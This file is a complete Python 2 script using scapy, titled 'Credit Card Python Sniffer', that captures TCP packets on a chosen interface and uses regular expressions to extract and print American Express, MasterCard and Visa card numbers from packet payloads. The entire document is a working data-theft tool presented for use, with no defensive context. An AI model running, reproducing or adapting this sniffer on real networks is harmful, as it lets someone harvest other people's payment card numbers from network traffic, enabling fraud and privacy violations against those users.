import re, argparse
from scapy.all import *

def findCreditCard(pkt):
	raw = pkt.sprintf('%Raw.load%')
	americaRE = re.findall('3[47][0-9]{13}', raw)
	masterRE = re.findall('5[1-5][0-9]{14}', raw)
	visaRE = re.findall('4[0-9]{12}(?:[0-9]{3})?', raw)

	if americaRE:
		print '[+] Found American Express Card: ' + americaRE[0]
	if masterRE:
		print '[+] Found MasterCard Card: ' + masterRE[0]
	if visaRE:
		print '[+] Found Visa Card: ' + visaRE[0]

def main():
	parser = argparse.ArgumentParser(description="Credit Card Python Sniffer")
	parser.add_argument('-i', dest="interface", type=str, help ='<Interface>')

	args = parser.parse_args()

	if args.interface == None:
		print parser.print_help()
		exit(0)
	else:
		print args.interface
		conf.iface = args.interface

	try:
		print '[*] Starting Credit Card Sniffer.'
		sniff(filter='tcp', prn=findCreditCard, store=0)

	except KeyboardInterrupt:
		exit(0)

if __name__ == "__main__":
	main()
